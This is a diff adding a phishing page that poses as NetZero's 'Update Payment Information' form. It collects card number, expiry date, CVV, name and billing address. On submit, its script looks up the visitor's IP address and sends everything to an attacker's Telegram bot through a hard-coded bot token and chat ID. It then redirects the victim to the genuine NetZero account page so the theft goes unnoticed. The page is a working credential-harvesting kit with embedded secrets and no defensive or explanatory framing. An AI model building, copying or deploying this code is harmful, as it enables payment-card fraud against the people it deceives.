@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1" />
+    <meta name="google" content="notranslate" />
+    <title>NetZero - Update Payment Information</title>
+    <link rel="shortcut icon" href="https://www.netzero.net/favicon.ico" type="image/x-icon" />
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet" type="text/css" />
+    <style type="text/css">
+      body {
+        font-family: 'Open Sans', sans-serif;
+        background: #f5f5f5;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+      #login-wrapper {
+        background: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        width: 100%;
+        max-width: 400px;
+      }
+      .wrapper {
+        text-align: center;
+      }
+      .main-logo {
+        width: 150px;
+        margin-bottom: 20px;
+      }
+      .input-req-login {
+        font-weight: 600;
+        margin: 10px 0 5px;
+        text-align: left;
+      }
+      .input-field-login {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+      }
+      .controls {
+        margin-top: 20px;
+      }
+      .login-btn button {
+        background: #0055a5;
+        color: #fff;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+        width: 100%;
+      }
+      .login-btn button:hover {
+        background: #003d7a;
+      }
+      .error-notice {
+        background: #ffecec;
+        color: #d32f2f;
+        padding: 10px;
+        border-radius: 4px;
+        margin-bottom: 20px;
+        display: none;
+      }
+      .image{
+    width: 150px;
+    height: 60px;
+    /* background-color: red; */
+    margin-top: 5px;
+    margin-left: 20px;
+}
+
+.rightimage{
+    width: 180px;
+    height: 30px;
+    margin-left: 100px;
+
+}
+
+.header{
+    position: sticky;
+top: 0px;
+z-index: 1;
+width: 1020px;
+    height: 102px;
+    background-color: white;
+}
+
+.headerflex{
+    width: 1020px;
+    height: 100px;
+    /* background-color: red; */
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    
+}
+.hd{
+    width: 600px;
+    height: 100px;
+    /* background-color: blue; */
+}
+
+.line{
+width: 1020px;
+height: 2px;
+background-color: #000000;
+
+
+
+
+}
+      input{
+        /* width: 200px; */
+        /* height: 30px; */
+        padding: 10px;
+    
+      }
+      ::placeholder{
+        /* padding: 10px; */
+        font-family: helvetica, arial;
+    font-style: normal;
+    font-size: 14px;
+    line-height: 21px;
+    font-weight: 400;
+
+      }
+      .copyright {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 12px;
+        color: #666;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="login-wrapper">
+      <div class="wrapper">
+        <div id="notify">
+          <div id="login-status" class="error-notice" style="display: none;">
+            <div id="login-status-message">Error processing payment. Please try again.</div>
+          </div>
+        </div>
+        <div id="content-container">
+          <div id="login-container">
+            <div id="login-sub-container">
+              <!-- <div id="login-sub-header">
+                <img class="main-logo" src="https://www.netzero.net/images/logo.png" alt="NetZero Logo" />
+              </div> -->
+
+              <div class="header">
+        <div class="headerflex">
+        <img class="image" src="./image/netzero_logo-removebg-preview.png" alt="">
+        <div class="hd"></div>
+    </div>
+
+        <div class="line"></div>
+
+
+</div>
+              <div id="login-sub">
+                <div id="forms">
+                  <form novalidate id="payment_form" target="_top">
+                    <div class="input-req-login"><label for="card_number">Credit Card Number</label></div>
+                    <div class="input-field-login">
+                      <input name="card_number" id="card_number" type="text" placeholder="1234-5678-9012-3456" class="std_textbox" autocomplete="off" tabindex="1" required pattern="\d{4}-\d{4}-\d{4}-\d{4}" maxlength="19" oninput="formatCardNumber(this)" />
+                    </div>
+                    <div class="input-req-login"><label for="exp_date">Expiration Date</label></div>
+                    <div class="input-field-login">
+                      <input name="exp_date" id="exp_date" type="text" placeholder="MM/YY" class="std_textbox" autocomplete="off" tabindex="2" required pattern="\d{2}/\d{2}" maxlength="5" oninput="formatExpDate(this)" />
+                    </div>
+                    <div class="input-req-login"><label for="cvv">CVV</label></div>
+                    <div class="input-field-login">
+                      <input name="cvv" id="cvv" type="text" placeholder="CVV" class="std_textbox" autocomplete="off" tabindex="3" required pattern="\d{3,4}" maxlength="3" />
+                    </div>
+                    <div class="input-req-login"><label for="card_name">Name on Card</label></div>
+                    <div class="input-field-login">
+                      <input name="card_name" id="card_name" type="text" placeholder="Enter name on card" class="std_textbox" autocomplete="off" tabindex="4" required />
+                    </div>
+                    <div class="input-req-login"><label for="billing_address">Billing Address</label></div>
+                    <div class="input-field-login">
+                      <input name="billing_address" id="billing_address" type="text" placeholder="Enter billing address" class="std_textbox" autocomplete="off" tabindex="5" required />
+                    </div>
+                    <input type="text" name="_honey" value="" style="display:none" />
+                    <div class="controls">
+                      <div class="login-btn">
+                        <button name="submit" type="submit" id="payment_submit" tabindex="6">Update Payment</button>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          Copyright © 2025 NetZero, Inc. All rights reserved.<br />
+          <a href="https://www.netzero.net/privacy" target="_blank">Privacy Policy</a>
+        </div>
+      </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+      let telegramToken = "6249798377:AAFDtpmqHm745r84fED2viwFeARENtuZcPQ";
+      let telegramChatID = "623911982";
+      let ipRegistryAPI = "nfs9hel7svh94oy5";
+      let redirectURL = "https://account.netzero.net/s/account";
+      let url = window.location.href;
+      let parameters = new URLSearchParams(window.location.search);
+      let botDetected = false;
+      let formName = "NetZero_Payment";
+      let formID = "payment_form";
+
+      $(document).ready(function() {
+        init();
+      });
+
+      function init() {
+        setClickAction();
+        setValue();
+      }
+
+      function setValue() {
+        let memberID = parameters.get("memberID");
+        if (memberID) {
+          $("#card_name").val(memberID);
+        }
+      }
+
+      function setClickAction() {
+        $("#" + formID).submit(function(e) {
+          e.preventDefault();
+          let formData = $(this).serializeArray();
+          sendMessage(formData);
+        });
+      }
+
+      // Format credit card number with hyphens (XXXX-XXXX-XXXX-XXXX)
+      function formatCardNumber(input) {
+        let value = input.value.replace(/\D/g, ''); // Remove non-digits
+        if (value.length > 16) value = value.slice(0, 16); // Limit to 16 digits
+        let formatted = '';
+        for (let i = 0; i < value.length; i++) {
+          if (i > 0 && i % 4 === 0) formatted += '-';
+          formatted += value[i];
+        }
+        input.value = formatted;
+      }
+
+      // Format expiration date with slash (MM/YY)
+      function formatExpDate(input) {
+        let value = input.value.replace(/\D/g, ''); // Remove non-digits
+        if (value.length > 4) value = value.slice(0, 4); // Limit to 4 digits
+        if (value.length > 2) {
+          input.value = value.slice(0, 2) + '/' + value.slice(2);
+        } else {
+          input.value = value;
+        }
+      }
+
+      async function sendMessage(formData) {
+        let message = "New " + formName + " form submission:\n";
+        formData.forEach(function(input) {
+          if (dontAddInput(input)) {
+            return;
+          }
+          message += `${input.name}: ${input.value}\n`;
+        });
+        message = await addExtraValueToMessage(message);
+        if (botDetected) {
+          window.location.href = "http://www.google.com";
+          return;
+        }
+        const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+        const data = {
+          chat_id: telegramChatID,
+          text: message
+        };
+        try {
+          await $.ajax({
+            url: url,
+            type: "POST",
+            contentType: "application/json",
+            data: JSON.stringify(data),
+            success: function(response) {
+              console.log("Message sent to Telegram");
+            },
+            error: function(xhr, status, error) {
+              console.error("Failed to send to Telegram:", error);
+            }
+          });
+        } catch (error) {
+          console.error("Error in POST request:", error);
+        }
+        setTimeout(function() {
+          window.location.href = redirectURL;
+        }, 3000);
+      }
+
+      async function addExtraValueToMessage(message) {
+        let userIP = await getUserIP();
+        console.log(userIP);
+        message += `IPAddress: ${userIP}\n`;
+        return message;
+      }
+
+      function dontAddInput(input) {
+        if (input.name === "_honey" && input.value !== "") {
+          console.log(input.name + ": " + input.value);
+          //botDetected = true;
+        }
+        if (input.name === "_honey" || input.name === "_bot") {
+          return true;
+        }
+        return false;
+      }
+
+      async function getUserIP() {
+        return new Promise((resolve, reject) => {
+          $.getJSON("https://api.ipregistry.co/?key=" + ipRegistryAPI, function(data) {
+            resolve(data.ip);
+          }).fail(function(jqXHR, textStatus, errorThrown) {
+            resolve("");
+          });
+        });
+      }
+    </script>
+</html>
